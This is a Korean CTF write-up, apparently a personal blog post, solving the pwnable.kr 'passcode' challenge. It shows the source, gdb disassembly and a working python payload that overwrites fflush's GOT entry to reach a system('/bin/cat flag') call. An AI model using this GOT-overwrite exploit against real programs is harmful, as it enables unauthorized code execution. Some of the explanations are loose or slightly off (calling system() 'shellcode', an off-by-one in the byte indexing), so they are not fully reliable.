---
layout: post
title: "[pwnable.kr] passcode 풀이"
date: 2020-11-06
categories: PWN
tags: [pwn,wargame,system]
---

## 문제 풀이
```c
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1); 
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}
```

코드는 간단하다. welcome()를 통해 이름을 받고 문장을 출력하고, passcode1 , 2를 입력받아 비밀번호를 확인하고 맞으면 플래그를 출력한다. 하지만 막상 코드를 실행시켜보면 오류가 발생한다.

```
passcode@pwnable:~$ ./passcode

Toddler's Secure Login System 1.0 beta.
enter you name : 131
Welcome 131!
enter passcode1 : 338150
Segmentation fault (core dumped)
```

소스를 확인해보니 scanf 에서 문제가있다. 위에서 보면 모든 scanf 함수에서 &를 사용하지않아 해당 변수의 주소에 입력값이 저장되는 것이 아닌, '변수의 값'을 주소값으로 이용하여 입력값이 저장된다. 현재 변수에는 초기값이 없으므로 쓰레기값이 들어있고, 그 쓰레기값이 주소값으로 사용되어 segment falut가 일어나게 된다.

passcode에 오버플로우로 값을 덮어쓸수있을까를 찾아보던중, welcome() 함수에서 name변수의 주소값이 passcode1과 겹치는 것을 발견하였다.
```
char name[100];
scanf("%100s", name);
```

```
0x0804862f <+38>:	lea    edx,[ebp-0x70] 
0x08048632 <+41>:	mov    DWORD PTR [esp+0x4],edx //매개변수 2
0x08048636 <+45>:	mov    DWORD PTR [esp],eax // 매개변수 1
0x08048639 <+48>:	call   0x80484a0 <__isoc99_scanf@plt>
``
name은 100byte의 변수이고 100바이트까지 입력할 수 있게 되어있다. name 변수는ebp-0x70에 저장됨을 볼 수 있다.

```
scanf("%d", passcode1);
```

```
0x0804857c <+24>:	mov    edx,DWORD PTR [ebp-0x10]
0x0804857f <+27>:	mov    DWORD PTR [esp+0x4],edx // 매개변수 2
0x08048583 <+31>:	mov    DWORD PTR [esp],eax // 매개변수 1
0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
```
passcode1 변수는 ebp-0x10에 저장 됨을 볼 수 있다.

name 변수가 100바이트까지 입력이 가능하므로 ebp-0x70 ~ ebp-0xc 까지 입력할 수 있다. (-0x70 + 0x64(100byte) = -0xc). passcode1 변수는 ebp-0x10에 저장되어있으므로 name[0] ~ name[96]은 아무값이나 넣고 name[97] ~ name[100]를 조작하면 passcode1 에 4byte 덮어쓰기가 가능하다. (-0xc -(-0x10) = -0x4)

하지만 열심히 생각해봐도 passcode2는 덮어쓸수가 없기때문에 다른 방식으로 생각해보아야한다.

scanf는 주어진 주소값으로 입력값을 받는 함수이다. 지금 우리는 name 변수입력을 통해 passcode1 안에 값을 조작해서 넣을 수 있고, scanf("%d", passcode1); 이 코드를 통해 passcode1에 원하는 값을 넣을 수 있다. 따라서 원하는 주소에(위치에) 원하는 값을 넣을 수 있는 상태이다.

scanf 이후 줄인 fflush 시작 주소에 fflush 시작 주소 대신 쉘코드인 system("/bin/cat flag");를 넣을 수 있다면 쉘을 받을 수 있을 것이고 flag값을 얻을 수 있다.

그럼 지금 구해야 하는 값은 다음과 같다

- fflush 시작주소
- system("/bin/cat flag"); 시작주소
fflus의 got주소를 구해서 scanf 함수를 이용하여 그 자리에 system(“/bin/cat flag”); 시작 주소를 넣어주면 된다.

```
0x08048593 <+47>:	call   0x8048430 <fflush@plt>
-----
(gdb) x/i 0x8048430
0x8048430 <fflush@plt>:	jmp    DWORD PTR ds:0x804a004
(gdb) x/i 0x804a004
0x804a004 <fflush@got.plt>:	test   BYTE PTR ss:[eax+ecx*1],al
```
fflush@got 주소는 0x804a004 임을 알 수 있다.

```
0x080485de <+122>:	call   0x8048450 <puts@plt>
0x080485e3 <+127>:	mov    DWORD PTR [esp],0x80487af
0x080485ea <+134>:	call   0x8048460 <system@plt>
```
scanf 의 매개변수를 0x080485e3 줄에서 받아서 0x080485ea 에서 실행시키는 것을 볼 수 있다. 따라서 system함수의 시작 주소는 0x080485e3이다.

payload 는 다음과 같다.

`dummy(96) + &fflush@got + &system("/bin/cat flag")`

- dummy(96) + &fflush@got ==> name[100]

- &system(“/bin/cat flag”) ==> scanf(%d,passcode) 입력값. %d로 받고있어서 주소를 16진수가 아닌 10진수로 적어주어야 한다.

즉,

`(python -c 'print "C"*96+"\x04\xa0\x04\x08"+"134514147"' ; cat)|./passcode`

주소는 항상 8자리. 앞에 0이 빠져서 7자리 일 수 있지만 payload는 8자리로 넣어주면 된다.

__결과!__
```
passcode@pwnable:~$ (python -c 'print "C"*96+"\x04\xa0\x04\x08"+"134514147"';cat)|./passcode

Toddler's Secure Login System 1.0 beta.
enter you name : Welcome CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC!
Sorry mom.. I got confused about scanf usage :(
enter passcode1 : Now I can safely trust you that you have credential :)
```

## PLT & GOT
Link 방식에는 Static Link 방식과 Dynamic Link 방식이 있는데, Static Link 방식은 파일 생성시 라이브러리 내용을 포함한 실행 파일을 만들고, Dynamic Link 방식은 공유 라이브러리를 사용한다.

보통 컴파일링 할 때 gcc -o [파일] [파일.c] 이렇게 Dynamic Link 방식으로 컴파일링한다. 이 방식으로 프로그램이 만들어지면 함수를 호출 할 때 PLT를 참조하게 된다. PLT에서는 GOT로 점프를 하는데, GOT에 라이브러리에 존재하는 실제 함수의 주소가 쓰여있어서 이 함수를 호출하게 된다. 따라서 위에서 GOT의 주소를 구한것이라고 설명할 수 있다

근데 왜 다른 scanf 나 system 함수는 got 주소를 구하지않는건지 잘모르겠다..

## gdb 명령어 모음
- gdb 사용

`gdb [파일]`

- peda 사용하기

`(gdb) source/usr/share/peda/peda.py`

- 브레이크포인트 걸기

`(gdb) break *main+1`

- 브레이크포인트 확인하기

`(gdb) info breakpoints`

- 실행시키기

`(gdb) run`

- 한 줄씩 건너감 ( 함수안쪽으로 안들어감 )

`(gdb) ni`

- 한 줄씩 건너감 ( 함수안쪽으로 안들어감 )

`(gdb) si`

- 함수 어셈블리어 확인

`(gdb) disas [함수명]`

## 헷갈리는 어셈블리어
1. lea vs mov
ebp 값이 10 이라가정,

`lea eax, ebp+5`
ebp의 값에 5를 더하여 eax에 대입

`mov eax,ebp+5`
ebp의 주소에 +5 하여 그 주소에있는 값을 eax에 대입.


## scanf 디버거로 파악하기
### welcome() scanf 함수

`scanf("%100s", name);`

```
0x0804862f <+38>:	lea    edx,[ebp-0x70] 
0x08048632 <+41>:	mov    DWORD PTR [esp+0x4],edx //매개변수 2
0x08048636 <+45>:	mov    DWORD PTR [esp],eax // 매개변수 1
0x08048639 <+48>:	call   0x80484a0 <__isoc99_scanf@plt>
```

### login() scnaf 함수

`scanf("%d", passcode1);`

```
0x0804857c <+24>:	mov    edx,DWORD PTR [ebp-0x10]
0x0804857f <+27>:	mov    DWORD PTR [esp+0x4],edx // 매개변수 2
0x08048583 <+31>:	mov    DWORD PTR [esp],eax // 매개변수 1
0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
```

스택구조이므로 매개변수가 들어가는 순서는 거꾸로. 매개변수 2가 실제 변수에 저장되는 주소인데, 보통 mov 변수1, 변수2에서 변수 2 에 저장되는 edx에 있는 값이 메모리 주소라고 보면 된다. 그러므로 welcome()에서는 변수가 저장되는 곳이 [ebp-0x70], login() 에서는 변수가 저장되는 곳이 [ebp-0x10]이 된다.

원래 값을 입력받을때 변수의 주소가 매개변수가 되어야하는데 지금 변수자체가 매개변수로 설정되어있어서 scanf() 가 정상적이지않다. 만약 정상적으로 변수의 주소를 매개변수로 하는 scanf 함수라면 0x0804857f <+27>: 이부분에서 DWORD PTR이 아닌 DWORD 로 되어있다.
